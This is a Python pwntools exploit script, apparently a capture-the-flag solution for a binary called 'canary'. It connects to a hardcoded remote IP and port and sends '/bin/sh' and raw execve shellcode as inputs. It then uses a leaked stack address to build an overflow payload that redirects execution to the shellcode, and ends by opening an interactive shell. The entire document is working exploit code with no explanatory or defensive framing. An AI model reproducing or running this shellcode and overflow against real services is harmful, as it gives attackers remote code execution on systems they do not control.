from pwn import *

r = remote("194.5.207.113", 7030)
# r = process('./canary')
# gdb.attach(r)

r.recvuntil(b"chars):")

shellcode1 = b"\x48\x8B\x3D\xDB\xFF\xFF\xFF\x34\x1F\x48\x31\xF6\x0F\x05"
shellcode2 = "/bin/sh\x00"

r.sendline(shellcode2) # str1
r.recvuntil(b"chars):")
r.sendline(shellcode1) # str2

addrhere = r.recvuntil(b"number:")
addrhere = addrhere.split(b"0x")[1][:12]
addrhere = int(b'0x' + addrhere, 16)
print(hex(addrhere))


payload = p64(addrhere + 0xc) + b"a"*12 + p64(addrhere - 0xf) 

# addrhere + 0xc = str1
# addrhere - 0xf = str2


r.sendline(payload)


r.interactive()